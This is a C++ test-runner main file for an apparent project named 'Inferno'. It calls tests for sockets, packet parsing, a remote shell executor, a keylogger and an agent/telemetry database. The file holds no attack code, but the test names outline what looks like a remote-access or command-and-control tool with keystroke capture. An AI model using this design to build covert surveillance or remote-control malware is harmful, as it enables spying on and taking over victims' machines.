#include <iostream>

// External socket tests
extern void test_socket_creation();
extern void test_end_to_end_connection();

// External server tests
extern void test_server_constructors();
extern void test_server_start();

// External packet tests
extern void test_packet_deserialization();
extern void test_packet_endianness();
extern void test_packet_size_limit();
extern void test_fragmented_deserialization();

// External shell executor tests
extern void test_shell_executor_echo();
extern void test_shell_executor_failure();
extern void test_shell_executor_stderr_redirect();
extern void test_shell_executor_chunk_size();

// External keylogger tests
extern void test_keylogger_init_state();
extern void test_keylogger_start_stop();
extern void test_keylogger_dump_clears_buffer();
extern void test_keylogger_capacity_limit();
extern void test_db_singleton();
extern void test_db_agent_registration();
extern void test_db_telemetry_history();

#include <QCoreApplication>

int main(int argc, char* argv[]) {
    // QSqlDatabase and other Qt components require a QCoreApplication instance
    QCoreApplication app(argc, argv);

    std::cout << "\n=== Inferno TDD Suite ===" << std::endl;
    
    test_socket_creation();
    test_end_to_end_connection();
    test_server_constructors();
    test_server_start();
    test_packet_deserialization();
    test_packet_endianness();
    test_packet_size_limit();
    test_fragmented_deserialization();
    test_shell_executor_echo();
    test_shell_executor_failure();
    test_shell_executor_stderr_redirect();
    test_shell_executor_chunk_size();
    
    test_keylogger_init_state();
    test_keylogger_start_stop();
    test_keylogger_dump_clears_buffer();
    test_keylogger_capacity_limit();
    
    // Circle 5 Persistence Tests
    test_db_singleton();
    test_db_agent_registration();
    test_db_telemetry_history();
    
    std::cout << "=========================\n" << std::endl;
    return 0;
}
